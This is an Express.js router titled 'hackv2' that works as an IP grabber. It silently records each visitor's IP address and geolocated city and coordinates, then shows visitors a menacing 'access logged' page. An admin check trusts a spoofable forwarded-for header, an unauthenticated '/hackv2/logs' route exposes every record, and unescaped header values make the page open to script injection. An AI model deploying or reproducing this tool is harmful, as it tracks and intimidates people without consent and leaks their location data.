const express = require('express');
const axios = require('axios');

const app = express();
const router = express.Router();
const PORT = 3000;

// In-memory logs
const logs = [];

// IP to allow admin access
const ADMIN_IP = '95.214.228.44';

// Middleware to parse IP
function getClientIp(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.ip
  );
}

// Route: Main
router.get('/hackv2/', async (req, res) => {
  const ip = getClientIp(req).replace('::ffff:', '');

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const geo = geoRes.data;

    if (ip === ADMIN_IP) {
      res.send(`
        <html>
          <head>
            <title>Admin Panel</title>
            <style>
              body {
                background-color: black;
                color: lime;
                font-family: monospace;
                padding: 20px;
              }
              h1 {
                animation: blink 1s step-end infinite;
              }
              @keyframes blink {
                50% { opacity: 0; }
              }
            </style>
          </head>
          <body>
            <h1>ACCESS GRANTED</h1>
            <p>Welcome, Admin. System logs:</p>
            <pre>${JSON.stringify(logs, null, 2)}</pre>
          </body>
        </html>
      `);
    } else {
      logs.push({
        ip,
        city: geo.city,
        region: geo.regionName,
        country: geo.country,
        lat: geo.lat,
        lon: geo.lon,
        time: new Date().toISOString(),
      });

      res.send(`
        <html>
          <head>
            <title>Access Logged</title>
            <style>
              body {
                background-color: black;
                color: lime;
                font-family: monospace;
                padding: 20px;
              }
              h1 {
                animation: blink 1s step-end infinite;
              }
            </style>
          </head>
          <body>
            <h1>Your access has been logged.</h1>
            <p>IP: ${ip}</p>
            <p>Location: ${geo.city}, ${geo.country}</p>
            <p>Search This On Google Maps: ${geo.lat} ${geo.lon}</p>
            <p>Time: ${new Date().toLocaleString()}</p>
          </body>
        </html>
      `);
    }
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
    res.status(500).send('Internal Server Error');
  }
});

// Route: view raw logs
router.get('/hackv2/logs', (req, res) => {
  res.json(logs);
});

module.exports = router;
